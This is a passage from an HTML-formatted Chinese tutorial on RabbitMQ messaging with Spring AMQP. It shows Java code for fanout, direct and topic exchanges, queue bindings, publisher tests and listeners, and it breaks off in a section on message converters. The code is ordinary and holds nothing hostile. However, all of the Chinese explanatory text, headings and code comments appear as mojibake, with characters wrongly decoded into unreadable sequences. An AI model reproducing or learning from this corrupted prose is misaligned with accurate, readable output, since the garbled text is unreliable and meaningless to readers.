itcast.fanoutï¼Œç±»å‹æ˜¯Fanout</li><li>åˆ›å»ºä¸¤ä¸ªé˜Ÿåˆ—fanout.queue1å’Œfanout.queue2ï¼Œç»‘å®šåˆ°äº¤æ¢æœºitcast.fanout</li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457955.png" alt="image-20210717165509466" /></p><h3 id="1241å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº"><a class="markdownIt-Anchor" href="#1241å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº"></a> 12.4.1.å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº</h3><p>Springæä¾›äº†ä¸€ä¸ªæ¥å£Exchangeï¼Œæ¥è¡¨ç¤ºæ‰€æœ‰ä¸åŒç±»å‹çš„äº¤æ¢æœºï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457956.png" alt="image-20210717165552676" /></p><p>åœ¨consumerä¸­åˆ›å»ºä¸€ä¸ªç±»ï¼Œå£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.mq.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Binding;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.BindingBuilder;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.FanoutExchange;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FanoutConfig</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å£°æ˜äº¤æ¢æœº</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Fanoutç±»å‹äº¤æ¢æœº</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FanoutExchange <span class="hljs-title function_">fanoutExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FanoutExchange</span>(<span class="hljs-string">&quot;itcast.fanout&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç¬¬1ä¸ªé˜Ÿåˆ—</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">fanoutQueue1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">&quot;fanout.queue1&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç»‘å®šé˜Ÿåˆ—å’Œäº¤æ¢æœº</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">bindingQueue1</span><span class="hljs-params">(Queue fanoutQueue1, FanoutExchange fanoutExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(fanoutQueue1).to(fanoutExchange);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç¬¬2ä¸ªé˜Ÿåˆ—</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">fanoutQueue2</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">&quot;fanout.queue2&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç»‘å®šé˜Ÿåˆ—å’Œäº¤æ¢æœº</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">bindingQueue2</span><span class="hljs-params">(Queue fanoutQueue2, FanoutExchange fanoutExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(fanoutQueue2).to(fanoutExchange);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1242æ¶ˆæ¯å‘é€"><a class="markdownIt-Anchor" href="#1242æ¶ˆæ¯å‘é€"></a> 12.4.2.æ¶ˆæ¯å‘é€</h3><p>åœ¨publisheræœåŠ¡çš„SpringAmqpTestç±»ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFanoutExchange</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">exchangeName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itcast.fanout&quot;</span>;<br>    <span class="hljs-comment">// æ¶ˆæ¯</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello, everyone!&quot;</span>;<br>    rabbitTemplate.convertAndSend(exchangeName, <span class="hljs-string">&quot;&quot;</span>, message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1243æ¶ˆæ¯æ¥æ”¶"><a class="markdownIt-Anchor" href="#1243æ¶ˆæ¯æ¥æ”¶"></a> 12.4.3.æ¶ˆæ¯æ¥æ”¶</h3><p>åœ¨consumeræœåŠ¡çš„SpringRabbitListenerä¸­æ·»åŠ ä¸¤ä¸ªæ–¹æ³•ï¼Œä½œä¸ºæ¶ˆè´¹è€…ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(queues = &quot;fanout.queue1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenFanoutQueue1</span><span class="hljs-params">(String msg)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…1æ¥æ”¶åˆ°Fanoutæ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(queues = &quot;fanout.queue2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenFanoutQueue2</span><span class="hljs-params">(String msg)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…2æ¥æ”¶åˆ°Fanoutæ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1244æ€»ç»“"><a class="markdownIt-Anchor" href="#1244æ€»ç»“"></a> 12.4.4.æ€»ç»“</h3><p>äº¤æ¢æœºçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</p><ul><li>æ¥æ”¶publisherå‘é€çš„æ¶ˆæ¯</li><li>å°†æ¶ˆæ¯æŒ‰ç…§è§„åˆ™è·¯ç”±åˆ°ä¸ä¹‹ç»‘å®šçš„é˜Ÿåˆ—</li><li>ä¸èƒ½ç¼“å­˜æ¶ˆæ¯ï¼Œè·¯ç”±å¤±è´¥ï¼Œæ¶ˆæ¯ä¸¢å¤±</li><li>FanoutExchangeçš„ä¼šå°†æ¶ˆæ¯è·¯ç”±åˆ°æ¯ä¸ªç»‘å®šçš„é˜Ÿåˆ—</li></ul><p>å£°æ˜é˜Ÿåˆ—ã€äº¤æ¢æœºã€ç»‘å®šå…³ç³»çš„Beanæ˜¯ä»€ä¹ˆï¼Ÿ</p><ul><li>Queue</li><li>FanoutExchange</li><li>Binding</li></ul><p>å¤šæ¶ˆè´¹è€…è®¢é˜…ä¸€ä¸ªé˜Ÿåˆ—ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ</p><ul><li>è¯¥é˜Ÿåˆ—ç›¸å½“äºWorkQueue</li></ul><h2 id="125direct"><a class="markdownIt-Anchor" href="#125direct"></a> 12.5.Direct</h2><p>åœ¨Fanoutæ¨¡å¼ä¸­ï¼Œä¸€æ¡æ¶ˆæ¯ï¼Œä¼šè¢«æ‰€æœ‰è®¢é˜…çš„é˜Ÿåˆ—éƒ½æ¶ˆè´¹ã€‚ä½†æ˜¯ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸åŒçš„æ¶ˆæ¯è¢«ä¸åŒçš„é˜Ÿåˆ—æ¶ˆè´¹ã€‚è¿™æ—¶å°±è¦ç”¨åˆ°Directç±»å‹çš„Exchangeã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457957.png" alt="image-20210717170041447" /></p><p>åœ¨Directæ¨¡å‹ä¸‹ï¼š</p><ul><li>é˜Ÿåˆ—ä¸äº¤æ¢æœºçš„ç»‘å®šï¼Œä¸èƒ½æ˜¯ä»»æ„ç»‘å®šäº†ï¼Œè€Œæ˜¯è¦æŒ‡å®šä¸€ä¸ª<code>RoutingKey</code>ï¼ˆè·¯ç”±keyï¼‰</li><li>æ¶ˆæ¯çš„å‘é€æ–¹åœ¨ å‘ Exchangeå‘é€æ¶ˆæ¯æ—¶ï¼Œä¹Ÿå¿…é¡»æŒ‡å®šæ¶ˆæ¯çš„ <code>RoutingKey</code>ã€‚</li><li>Exchangeä¸å†æŠŠæ¶ˆæ¯äº¤ç»™æ¯ä¸€ä¸ªç»‘å®šçš„é˜Ÿåˆ—ï¼Œè€Œæ˜¯æ ¹æ®æ¶ˆæ¯çš„<code>Routing Key</code>è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰é˜Ÿåˆ—çš„<code>Routingkey</code>ä¸æ¶ˆæ¯çš„ <code>Routing key</code>å®Œå…¨ä¸€è‡´ï¼Œæ‰ä¼šæ¥æ”¶åˆ°æ¶ˆæ¯</li></ul><p><strong>æ¡ˆä¾‹éœ€æ±‚å¦‚ä¸‹</strong>ï¼š</p><ol><li><p>åˆ©ç”¨@RabbitListenerå£°æ˜Exchangeã€Queueã€RoutingKey</p></li><li><p>åœ¨consumeræœåŠ¡ä¸­ï¼Œç¼–å†™ä¸¤ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ï¼Œåˆ†åˆ«ç›‘å¬direct.queue1å’Œdirect.queue2</p></li><li><p>åœ¨publisherä¸­ç¼–å†™æµ‹è¯•æ–¹æ³•ï¼Œå‘itcast. directå‘é€æ¶ˆæ¯</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457958.png" alt="image-20210717170223317" /></p><h3 id="1251åŸºäºæ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº"><a class="markdownIt-Anchor" href="#1251åŸºäºæ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº"></a> 12.5.1.åŸºäºæ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœº</h3><p>åŸºäº@Beançš„æ–¹å¼å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºæ¯”è¾ƒéº»çƒ¦ï¼ŒSpringè¿˜æä¾›äº†åŸºäºæ³¨è§£æ–¹å¼æ¥å£°æ˜ã€‚</p><p>åœ¨consumerçš„SpringRabbitListenerä¸­æ·»åŠ ä¸¤ä¸ªæ¶ˆè´¹è€…ï¼ŒåŒæ—¶åŸºäºæ³¨è§£æ¥å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;direct.queue1&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span><br><span class="hljs-meta">    key = &#123;&quot;red&quot;, &quot;blue&quot;&#125;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenDirectQueue1</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…æ¥æ”¶åˆ°direct.queue1çš„æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;direct.queue2&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span><br><span class="hljs-meta">    key = &#123;&quot;red&quot;, &quot;yellow&quot;&#125;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenDirectQueue2</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…æ¥æ”¶åˆ°direct.queue2çš„æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1252æ¶ˆæ¯å‘é€"><a class="markdownIt-Anchor" href="#1252æ¶ˆæ¯å‘é€"></a> 12.5.2.æ¶ˆæ¯å‘é€</h3><p>åœ¨publisheræœåŠ¡çš„SpringAmqpTestç±»ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendDirectExchange</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// äº¤æ¢æœºåç§°</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">exchangeName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itcast.direct&quot;</span>;<br>    <span class="hljs-comment">// æ¶ˆæ¯</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;çº¢è‰²è­¦æŠ¥ï¼æ—¥æœ¬ä¹±æ’æ ¸åºŸæ°´ï¼Œå¯¼è‡´æµ·æ´‹ç”Ÿç‰©å˜å¼‚ï¼ŒæƒŠç°å“¥æ–¯æ‹‰ï¼&quot;</span>;<br>    <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span><br>    rabbitTemplate.convertAndSend(exchangeName, <span class="hljs-string">&quot;red&quot;</span>, message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1253æ€»ç»“"><a class="markdownIt-Anchor" href="#1253æ€»ç»“"></a> 12.5.3.æ€»ç»“</h3><p>æè¿°ä¸‹Directäº¤æ¢æœºä¸Fanoutäº¤æ¢æœºçš„å·®å¼‚ï¼Ÿ</p><ul><li>Fanoutäº¤æ¢æœºå°†æ¶ˆæ¯è·¯ç”±ç»™æ¯ä¸€ä¸ªä¸ä¹‹ç»‘å®šçš„é˜Ÿåˆ—</li><li>Directäº¤æ¢æœºæ ¹æ®RoutingKeyåˆ¤æ–­è·¯ç”±ç»™å“ªä¸ªé˜Ÿåˆ—</li><li>å¦‚æœå¤šä¸ªé˜Ÿåˆ—å…·æœ‰ç›¸åŒçš„RoutingKeyï¼Œåˆ™ä¸FanoutåŠŸèƒ½ç±»ä¼¼</li></ul><p>åŸºäº@RabbitListeneræ³¨è§£å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºæœ‰å“ªäº›å¸¸è§æ³¨è§£ï¼Ÿ</p><ul><li>@Queue</li><li>@Exchange</li></ul><h2 id="126topic"><a class="markdownIt-Anchor" href="#126topic"></a> 12.6.Topic</h2><h3 id="1261è¯´æ˜"><a class="markdownIt-Anchor" href="#1261è¯´æ˜"></a> 12.6.1.è¯´æ˜</h3><p><code>Topic</code>ç±»å‹çš„<code>Exchange</code>ä¸<code>Direct</code>ç›¸æ¯”ï¼Œéƒ½æ˜¯å¯ä»¥æ ¹æ®<code>RoutingKey</code>æŠŠæ¶ˆæ¯è·¯ç”±åˆ°ä¸åŒçš„é˜Ÿåˆ—ã€‚åªä¸è¿‡<code>Topic</code>ç±»å‹<code>Exchange</code>å¯ä»¥è®©é˜Ÿåˆ—åœ¨ç»‘å®š<code>Routing key</code> çš„æ—¶å€™ä½¿ç”¨é€šé…ç¬¦ï¼</p><p><code>Routingkey</code> ä¸€èˆ¬éƒ½æ˜¯æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå•è¯ç»„æˆï¼Œå¤šä¸ªå•è¯ä¹‹é—´ä»¥â€.â€åˆ†å‰²ï¼Œä¾‹å¦‚ï¼š <code>item.insert</code></p><p>é€šé…ç¬¦è§„åˆ™ï¼š</p><p><code>#</code>ï¼šåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªè¯</p><p><code>*</code>ï¼šåŒ¹é…ä¸å¤šä¸å°‘æ°å¥½1ä¸ªè¯</p><p>ä¸¾ä¾‹ï¼š</p><p><code>item.#</code>ï¼šèƒ½å¤ŸåŒ¹é…<code>item.spu.insert</code> æˆ–è€… <code>item.spu</code></p><p><code>item.*</code>ï¼šåªèƒ½åŒ¹é…<code>item.spu</code></p><p>â€‹</p><p>å›¾ç¤ºï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457959.png" alt="image-20210717170705380" /></p><p>è§£é‡Šï¼š</p><ul><li>Queue1ï¼šç»‘å®šçš„æ˜¯<code>china.#</code> ï¼Œå› æ­¤å‡¡æ˜¯ä»¥ <code>china.</code>å¼€å¤´çš„<code>routing key</code> éƒ½ä¼šè¢«åŒ¹é…åˆ°ã€‚åŒ…æ‹¬china.newså’Œchina.weather</li><li>Queue2ï¼šç»‘å®šçš„æ˜¯<code>#.news</code> ï¼Œå› æ­¤å‡¡æ˜¯ä»¥ <code>.news</code>ç»“å°¾çš„ <code>routing key</code> éƒ½ä¼šè¢«åŒ¹é…ã€‚åŒ…æ‹¬china.newså’Œjapan.news</li></ul><p>æ¡ˆä¾‹éœ€æ±‚ï¼š</p><p>å®ç°æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li><p>å¹¶åˆ©ç”¨@RabbitListenerå£°æ˜Exchangeã€Queueã€RoutingKey</p></li><li><p>åœ¨consumeræœåŠ¡ä¸­ï¼Œç¼–å†™ä¸¤ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ï¼Œåˆ†åˆ«ç›‘å¬topic.queue1å’Œtopic.queue2</p></li><li><p>åœ¨publisherä¸­ç¼–å†™æµ‹è¯•æ–¹æ³•ï¼Œå‘itcast. topicå‘é€æ¶ˆæ¯</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457960.png" alt="image-20210717170829229" /></p><h3 id="1262æ¶ˆæ¯å‘é€"><a class="markdownIt-Anchor" href="#1262æ¶ˆæ¯å‘é€"></a> 12.6.2.æ¶ˆæ¯å‘é€</h3><p>åœ¨publisheræœåŠ¡çš„SpringAmqpTestç±»ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * topicExchange</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendTopicExchange</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// äº¤æ¢æœºåç§°</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">exchangeName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itcast.topic&quot;</span>;<br>    <span class="hljs-comment">// æ¶ˆæ¯</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;å–œæŠ¥ï¼å­™æ‚Ÿç©ºå¤§æˆ˜å“¥æ–¯æ‹‰ï¼Œèƒœ!&quot;</span>;<br>    <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span><br>    rabbitTemplate.convertAndSend(exchangeName, <span class="hljs-string">&quot;china.news&quot;</span>, message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1263æ¶ˆæ¯æ¥æ”¶"><a class="markdownIt-Anchor" href="#1263æ¶ˆæ¯æ¥æ”¶"></a> 12.6.3.æ¶ˆæ¯æ¥æ”¶</h3><p>åœ¨consumeræœåŠ¡çš„SpringRabbitListenerä¸­æ·»åŠ æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;topic.queue1&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span><br><span class="hljs-meta">    key = &quot;china.#&quot;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenTopicQueue1</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…æ¥æ”¶åˆ°topic.queue1çš„æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;topic.queue2&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span><br><span class="hljs-meta">    key = &quot;#.news&quot;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenTopicQueue2</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…æ¥æ”¶åˆ°topic.queue2çš„æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>type = ExchangeTypes.TOPIC)</code> æŒ‡å®šäº¤æ¢æœºç±»å‹ï¼Œé»˜è®¤ä¸º<code>direct</code></p><h3 id="1264æ€»ç»“"><a class="markdownIt-Anchor" href="#1264æ€»ç»“"></a> 12.6.4.æ€»ç»“</h3><p>æè¿°ä¸‹Directäº¤æ¢æœºä¸Topicäº¤æ¢æœºçš„å·®å¼‚ï¼Ÿ</p><ul><li>Topicäº¤æ¢æœºæ¥æ”¶çš„æ¶ˆæ¯RoutingKeyå¿…é¡»æ˜¯å¤šä¸ªå•è¯ï¼Œä»¥ <code>**.**</code> åˆ†å‰²</li><li>Topicäº¤æ¢æœºä¸é˜Ÿåˆ—ç»‘å®šæ—¶çš„bindingKeyå¯ä»¥æŒ‡å®šé€šé…ç¬¦</li><li><code>#</code>ï¼šä»£è¡¨0ä¸ªæˆ–å¤šä¸ªè¯</li><li><code>*</code>ï¼šä»£è¡¨1ä¸ªè¯</li></ul><h2 id="127æ¶ˆæ¯è½¬æ¢å™¨"><a class="markdownIt-Anchor" href="#127æ¶ˆæ¯è½¬æ¢å™¨"></a> 12.7.æ¶ˆæ¯è½¬æ¢å™¨</h2><p>ä¹‹å‰è¯´è¿‡ï¼ŒSpringä¼šæŠŠä½ å‘é€çš„æ¶ˆæ¯åºåˆ—åŒ–ä¸ºå­—èŠ‚å‘é€ç»™MQï¼Œæ¥æ”¶æ¶ˆæ¯çš„æ—¶å€™ï¼Œè¿˜ä¼šæŠŠå­—èŠ‚ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457961.png" alt="image-20200525170410401" /></p><p>åªä¸è¿‡ï¼Œé»˜è®¤æƒ…å†µä¸‹Springé‡‡ç”¨çš„åºåˆ—åŒ–æ–¹å¼æ˜¯JDKåºåˆ—åŒ–ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒJDKåºåˆ—åŒ–å­˜åœ¨ä¸‹åˆ—é—®é¢˜ï¼š</p><ul><li>æ•°æ®ä½“ç§¯è¿‡å¤§</li><li>æœ‰å®‰å…¨æ¼æ´</li><li>å¯è¯»æ€§å·®</li></ul><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</p><h3 id="1271æµ‹è¯•é»˜è®¤è½¬æ¢å™¨"><a class="markdownIt-Anchor" href="#1271æµ‹è¯•é»˜è®¤è½¬æ¢å™¨"></a> 12.7.1.æµ‹è¯•é»˜è®¤è½¬æ¢å™¨</h3><p>æˆ‘ä»¬ä¿®æ”¹æ¶ˆæ¯å‘é€çš„ä»£ç ï¼Œå‘é€ä¸€ä¸ªMapå¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendMap</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    <span class="hljs-comment">// å‡†å¤‡æ¶ˆæ¯</span><br>    Map&lt;String,Object&gt; msg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    msg.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Jack&quot;</span>);<br>    msg.put(<span class="hljs-string">&quot;age&quot;</span>, <span class="hljs-number">21</span>);<br>    <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span><br>    rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;simple.queue&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, 